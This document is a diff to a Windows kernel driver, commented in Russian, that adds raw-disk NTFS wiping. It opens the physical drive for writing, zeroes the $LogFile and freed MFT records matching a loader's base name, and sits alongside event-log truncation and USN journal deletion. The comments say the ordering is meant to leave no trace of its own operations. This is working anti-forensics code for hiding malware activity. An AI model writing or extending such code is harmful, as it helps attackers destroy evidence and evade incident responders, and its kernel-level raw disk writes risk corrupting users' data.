@@ -24,6 +24,8 @@
 
 #include <ntifs.h>   // ZwDeleteFile / ZwFsControlFile / FILE_INFORMATION_CLASS
 #include <ntstrsafe.h>
+#include <ntdddisk.h>  // IOCTL_DISK_GET_PARTITION_INFO_EX, PARTITION_INFORMATION_EX
+#include <ntddstor.h>  // IOCTL_STORAGE_GET_DEVICE_NUMBER, STORAGE_DEVICE_NUMBER
 #include "clean_request.h"
 
 // FSCTL_QUERY_USN_JOURNAL / FSCTL_DELETE_USN_JOURNAL и структуры
@@ -281,6 +283,278 @@ static void KrTruncateEvtx(_In_ PCWSTR path) {
         ZwSetInformationFile(h, &iosb, &eof, sizeof(eof), FileEndOfFileInformation);
         ZwClose(h);
     } __except (EXCEPTION_EXECUTE_HANDLER) {}
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Raw NTFS (SC_DO_RAWNTFS): zero $LogFile + освобождённые MFT-записи.
+//
+// BSOD-рисковая часть: пишем по сырому диску НИЖЕ файловой системы. Жёсткая
+// валидация на каждом шаге (сигнатуры NTFS/FILE, bounds по размеру тома,
+// free-флаг MFT-записи, имя файла в записи). При любом несовпадении — пропуск,
+// а не запись не туда.
+// ─────────────────────────────────────────────────────────────────────────────
+
+typedef struct _SC_NTFS_CTX {
+    HANDLE   disk;              // \??\PhysicalDriveN, read+write, no buffering
+    ULONG    bytesPerSector;
+    ULONG    sectorsPerCluster;
+    ULONG64  clusterSize;
+    ULONG64  mftStartLcn;
+    ULONG64  mftRecordSize;
+    ULONG64  partitionStart;    // byte offset тома на физическом диске
+    ULONG64  totalSectors;
+} SC_NTFS_CTX;
+
+// Чтение с сырого диска (offset/size sector-aligned — обеспечивает вызывающий).
+static bool KrDiskRead(_In_ SC_NTFS_CTX* ctx, _In_ ULONG64 offset,
+                       _Out_ PVOID buf, _In_ ULONG size) {
+    LARGE_INTEGER off; off.QuadPart = (LONGLONG)offset;
+    IO_STATUS_BLOCK iosb{};
+    return NT_SUCCESS(ZwReadFile(ctx->disk, nullptr, nullptr, nullptr, &iosb,
+                                 buf, size, &off, nullptr));
+}
+
+// Затирка нулями [offset, offset+size) по одному сектору за раз.
+static bool KrDiskWriteZeros(_In_ SC_NTFS_CTX* ctx, _In_ ULONG64 offset,
+                             _In_ ULONG64 size) {
+    UCHAR* zeros = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
+                                           ctx->bytesPerSector, 'czS0');
+    if (!zeros) return false;
+    RtlSecureZeroMemory(zeros, ctx->bytesPerSector);
+    bool ok = true;
+    ULONG64 done = 0;
+    while (done < size) {
+        LARGE_INTEGER off; off.QuadPart = (LONGLONG)(offset + done);
+        IO_STATUS_BLOCK iosb{};
+        if (!NT_SUCCESS(ZwWriteFile(ctx->disk, nullptr, nullptr, nullptr, &iosb,
+                                    zeros, ctx->bytesPerSector, &off, nullptr))) {
+            ok = false; break;
+        }
+        done += ctx->bytesPerSector;
+    }
+    ExFreePoolWithTag(zeros, 'czS0');
+    return ok;
+}
+
+// Открыть физический диск для тома (буква, напр. L'C') и прочитать геометрию NTFS.
+static bool KrOpenNtfsVolume(_In_ wchar_t driveLetter, _Out_ SC_NTFS_CTX* ctx) {
+    RtlSecureZeroMemory(ctx, sizeof(*ctx));
+
+    // 1. Хэндл тома → partition start + physical drive number.
+    wchar_t volPath[16] = { L'\\', L'?', L'?', L'\\', driveLetter, L':', 0 };
+    UNICODE_STRING usVol;
+    RtlInitUnicodeString(&usVol, volPath);
+    OBJECT_ATTRIBUTES oaVol;
+    InitializeObjectAttributes(&oaVol, &usVol, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                               nullptr, nullptr);
+    IO_STATUS_BLOCK iosb{};
+    HANDLE hVol = nullptr;
+    if (!NT_SUCCESS(ZwCreateFile(&hVol, GENERIC_READ, &oaVol, &iosb, nullptr,
+                                 FILE_ATTRIBUTE_NORMAL,
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 FILE_OPEN, 0, nullptr, 0)))
+        return false;
+
+    PARTITION_INFORMATION_EX pi{};
+    ULONG ret = 0;
+    NTSTATUS st = ZwDeviceIoControlFile(hVol, nullptr, nullptr, nullptr, &iosb,
+                                        IOCTL_DISK_GET_PARTITION_INFO_EX,
+                                        nullptr, 0, &pi, sizeof(pi));
+    // Номер физического диска.
+    STORAGE_DEVICE_NUMBER dn{};
+    IO_STATUS_BLOCK iosb2{};
+    NTSTATUS st2 = ZwDeviceIoControlFile(hVol, nullptr, nullptr, nullptr, &iosb2,
+                                         IOCTL_STORAGE_GET_DEVICE_NUMBER,
+                                         nullptr, 0, &dn, sizeof(dn));
+    ZwClose(hVol);
+    if (!NT_SUCCESS(st) || !NT_SUCCESS(st2))
+        return false;
+
+    ctx->partitionStart = (ULONG64)pi.StartingOffset.QuadPart;
+
+    // 2. Открываем \??\PhysicalDrive<N> на чтение+запись без буферизации.
+    wchar_t diskPath[32];
+    RtlStringCchPrintfW(diskPath, RTL_NUMBER_OF(diskPath),
+                        L"\\??\\PhysicalDrive%lu", dn.DeviceNumber);
+    UNICODE_STRING usDisk;
+    RtlInitUnicodeString(&usDisk, diskPath);
+    OBJECT_ATTRIBUTES oaDisk;
+    InitializeObjectAttributes(&oaDisk, &usDisk, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                               nullptr, nullptr);
+    IO_STATUS_BLOCK diosb{};
+    HANDLE hDisk = nullptr;
+    st = ZwCreateFile(&hDisk, GENERIC_READ | GENERIC_WRITE, &oaDisk, &diosb,
+                      nullptr, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN,
+                      FILE_NO_INTERMEDIATE_BUFFERING, nullptr, 0);
+    if (!NT_SUCCESS(st) || !hDisk)
+        return false;
+    ctx->disk = hDisk;
+
+    // 3. Boot sector NTFS (по partitionStart).
+    UCHAR boot[512];
+    if (!KrDiskRead(ctx, ctx->partitionStart, boot, sizeof(boot))) {
+        ZwClose(hDisk); ctx->disk = nullptr; return false;
+    }
+    // Валидация: OEM "NTFS    ".
+    if (RtlCompareMemory(boot + 3, "NTFS    ", 8) != 8) {
+        ZwClose(hDisk); ctx->disk = nullptr; return false;
+    }
+    ctx->bytesPerSector   = *(USHORT*)(boot + 0x0B);
+    ctx->sectorsPerCluster= *(UCHAR*)(boot + 0x0D);
+    ctx->totalSectors     = *(ULONG64*)(boot + 0x28);
+    ctx->mftStartLcn      = *(ULONG64*)(boot + 0x30);
+    const CHAR cpfr       = *(CHAR*)(boot + 0x40); // signed
+    ctx->clusterSize      = (ULONG64)ctx->bytesPerSector * ctx->sectorsPerCluster;
+    ctx->mftRecordSize    = (cpfr < 0) ? (1ULL << (-cpfr))
+                                       : ((ULONG64)cpfr * ctx->clusterSize);
+
+    // Санити: сектор 512/4096, cluster > 0, recordSize 1024/4096.
+    if ((ctx->bytesPerSector != 512 && ctx->bytesPerSector != 4096) ||
+        ctx->sectorsPerCluster == 0 || ctx->totalSectors == 0 ||
+        (ctx->mftRecordSize != 1024 && ctx->mftRecordSize != 4096)) {
+        ZwClose(hDisk); ctx->disk = nullptr; return false;
+    }
+    return true;
+}
+
+// Парсит run-list $DATA атрибута MFT-записи и затирает регионы нулями.
+// Только non-resident $DATA. Валидация LCN против totalSectors.
+static void KrZeroDataRuns(_In_ SC_NTFS_CTX* ctx, _In_ UCHAR* record,
+                           _In_ ULONG recordSize) {
+    // Заголовок FILE-записи.
+    if (RtlCompareMemory(record, "FILE", 4) != 4) return;
+    const USHORT firstAttrOff = *(USHORT*)(record + 0x14);
+    ULONG off = firstAttrOff;
+    ULONG guard = 0;
+    while (off + 8 < recordSize && guard++ < 64) {
+        const ULONG attrType = *(ULONG*)(record + off);
+        if (attrType == 0xFFFFFFFF) break; // конец атрибутов
+        const ULONG attrLen = *(ULONG*)(record + off + 4);
+        if (attrLen < 8 || off + attrLen > recordSize) break;
+
+        if (attrType == 0x80) { // $DATA
+            const UCHAR nonResident = *(record + off + 8);
+            if (nonResident) {
+                const USHORT runOff = *(USHORT*)(record + off + 0x20);
+                UCHAR* run = record + off + runOff;
+                ULONG64 lcn = 0;
+                while (*run) {
+                    const UCHAR lenBytes = *run & 0x0F;
+                    const UCHAR offBytes = (*run >> 4) & 0x0F;
+                    if (!lenBytes || !offBytes || lenBytes > 8 || offBytes > 8) break;
+                    ++run;
+                    ULONG64 count = 0;
+                    for (UCHAR i = 0; i < lenBytes; ++i)
+                        count |= (ULONG64)(*run++) << (8 * i);
+                    LONG64 delta = 0;
+                    for (UCHAR i = 0; i < offBytes; ++i)
+                        delta |= (LONG64)(*run++) << (8 * i);
+                    // знаковое расширение delta
+                    if (offBytes && (delta & (1LL << (offBytes * 8 - 1))))
+                        delta |= ~0LL << (offBytes * 8);
+                    lcn += (ULONG64)delta;
+
+                    // Валидация региона против размера тома.
+                    const ULONG64 regionBytes = count * ctx->clusterSize;
+                    const ULONG64 volBytes = ctx->totalSectors * ctx->bytesPerSector;
+                    const ULONG64 regionOff = ctx->partitionStart +
+                                              lcn * ctx->clusterSize;
+                    if (count && lcn * ctx->clusterSize < volBytes &&
+                        regionOff + regionBytes <= ctx->partitionStart + volBytes) {
+                        KrDiskWriteZeros(ctx, regionOff, regionBytes);
+                    }
+                }
+            }
+        }
+        off += attrLen;
+    }
+}
+
+// Затирает $LogFile (MFT record 2) регионы нулями.
+static void KrWipeLogFile(_In_ SC_NTFS_CTX* ctx) {
+    const ULONG64 recOff = ctx->partitionStart +
+                           ctx->mftStartLcn * ctx->clusterSize +
+                           2ULL * ctx->mftRecordSize;
+    UCHAR* record = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
+                                            (ULONG)ctx->mftRecordSize, 'grLF');
+    if (!record) return;
+    if (KrDiskRead(ctx, recOff, record, (ULONG)ctx->mftRecordSize)) {
+        // Валидация: "FILE" + это $LogFile (имя "$LogFile" в $FILE_NAME).
+        if (RtlCompareMemory(record, "FILE", 4) == 4) {
+            KrZeroDataRuns(ctx, record, (ULONG)ctx->mftRecordSize);
+        }
+    }
+    ExFreePoolWithTag(record, 'grLF');
+}
+
+// Затирает освобождённые MFT-записи по индексам (после удаления файлов).
+// Только если запись free (flags bit0 == 0) и её $FILE_NAME матчит base.
+static void KrZeroMftRecords(_In_ SC_NTFS_CTX* ctx,
+                             _In_reads_(n) const unsigned long long* indices,
+                             _In_ ULONG n, _In_ PCWSTR baseName) {
+    if (!indices || !n) return;
+    UCHAR* record = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
+                                            (ULONG)ctx->mftRecordSize, 'gmFR');
+    if (!record) return;
+    const ULONG64 volBytes = ctx->totalSectors * ctx->bytesPerSector;
+
+    for (ULONG i = 0; i < n; ++i) {
+        const ULONG64 idx = indices[i];
+        if (!idx) continue;
+        const ULONG64 recOff = ctx->partitionStart +
+                               ctx->mftStartLcn * ctx->clusterSize +
+                               idx * ctx->mftRecordSize;
+        // Bounds: запись целиком в пределах тома.
+        if (idx * ctx->mftRecordSize + ctx->mftRecordSize > volBytes) continue;
+        if (!KrDiskRead(ctx, recOff, record, (ULONG)ctx->mftRecordSize)) continue;
+
+        // Валидация: сигнатура FILE + запись СВОБОДНА (flags bit0 == 0).
+        if (RtlCompareMemory(record, "FILE", 4) != 4) continue;
+        const USHORT flags = *(USHORT*)(record + 0x16);
+        if (flags & 0x01) continue; // in use — не трогаем (не наша/живая)
+
+        // Доп. страховка: имя в $FILE_NAME должно матчить наш base.
+        bool nameMatch = true;
+        if (baseName && baseName[0]) {
+            nameMatch = false;
+            const USHORT firstAttrOff = *(USHORT*)(record + 0x14);
+            ULONG off = firstAttrOff;
+            ULONG guard = 0;
+            while (off + 8 < ctx->mftRecordSize && guard++ < 64) {
+                const ULONG attrType = *(ULONG*)(record + off);
+                if (attrType == 0xFFFFFFFF) break;
+                const ULONG attrLen = *(ULONG*)(record + off + 4);
+                if (attrLen < 8 || off + attrLen > ctx->mftRecordSize) break;
+                if (attrType == 0x30) { // $FILE_NAME
+                    const UCHAR nameLen = *(record + off + 0x50);
+                    const wchar_t* fn = (const wchar_t*)(record + off + 0x5A);
+                    if (nameLen && ScContainsCi(fn, nameLen, baseName))
+                        nameMatch = true;
+                }
+                off += attrLen;
+            }
+        }
+        if (!nameMatch) continue;
+
+        // Затираем запись нулями — имя удалённого файла исчезает из $MFT.
+        KrDiskWriteZeros(ctx, recOff, ctx->mftRecordSize);
+    }
+    ExFreePoolWithTag(record, 'gmFR');
+}
+
+static void ScDoRawNtfs(_In_ const CleanRequest* req) {
+    // Работаем на системном томе (Prefetch/CrashDumps/Downloads/Desktop почти
+    // всегда на нём). $LogFile + MFT-записи наших файлов.
+    if (!req->system_volume[0]) return;
+    SC_NTFS_CTX ctx{};
+    if (!KrOpenNtfsVolume(req->system_volume[0], &ctx))
+        return; // layout не распознан — пропуск, а не запись не туда
+    __try {
+        KrWipeLogFile(&ctx);
+        KrZeroMftRecords(&ctx, req->mft_indices, req->file_count,
+                         req->loader_base);
+    } __except (EXCEPTION_EXECUTE_HANDLER) {}
+    if (ctx.disk) ZwClose(ctx.disk);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -620,9 +894,12 @@ extern "C" NTSTATUS ShadowCleanEntry(_In_ CleanRequest* reqUser,
     // Порядок важен: USN journal — ПОСЛЕДНИМ, чтобы наши собственные
     // файловые/реестровые операции не остались в журнале (после удаления
     // журнала новые записи не пишутся до его пересоздания).
+    // Raw NTFS (MFT/$LogFile) — ниже файловой системы, в USN не журналируется;
+    // MFT-записи затираются ПОСЛЕ удаления файлов (записи уже free).
     if (req.flags & SC_DO_REGISTRY) ScDoRegistry(&req);
     if (req.flags & SC_DO_FILES)    ScDoFiles(&req);
     if (req.flags & SC_DO_EVENTLOG) ScDoEventLogs();
+    if (req.flags & SC_DO_RAWNTFS)  ScDoRawNtfs(&req);
     if (req.flags & SC_DO_USN)      ScDoUsn(&req);
 
     return STATUS_SUCCESS;
